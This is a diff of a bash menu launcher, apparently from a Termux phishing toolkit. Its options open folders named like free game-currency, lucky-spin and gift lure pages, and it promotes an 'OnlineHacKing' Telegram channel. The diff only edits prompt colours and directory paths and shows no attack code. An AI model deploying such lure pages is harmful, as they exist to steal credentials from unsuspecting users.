@@ -50,11 +50,11 @@ echo ""
 echo ""
  
                  echo -e $'\e[1;33m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;96m        ---------------      \e[1;33m  [ ]\e[0m'   
-                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m         You Want to Choose  \e[1;91m  > > > > > \e[0m' option
+                 read -p $'e[1;96m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;33m         You Want to Choose  \e[1;92m  : \e[0m' option
                  echo ""
 		 if [ $option = 01 ] || [ $option = 1 ]
                  then 
-                           cd /data/data/com.termux/files/usr/bin/phs
+                           cd phs
                            cd Free-UC-Buy-OH/
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
@@ -125,7 +125,7 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
 	          break;
                   elif [ $option = 02 ] || [ $option = 2 ]
 	          then
-	                   cd /data/data/com.termux/files/usr/bin/phs
+	                   cd phs
                            cd Lucky-Spin-OH/       
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
@@ -196,7 +196,7 @@ echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n
                   break;
                   elif [ $option = 03 ] || [ $option = 3 ]
 	          then
-                           cd /data/data/com.termux/files/usr/bin/phs
+                           cd phs
                            cd BonusChallenge-Free-Gift-OH/
                            echo ""
                            echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
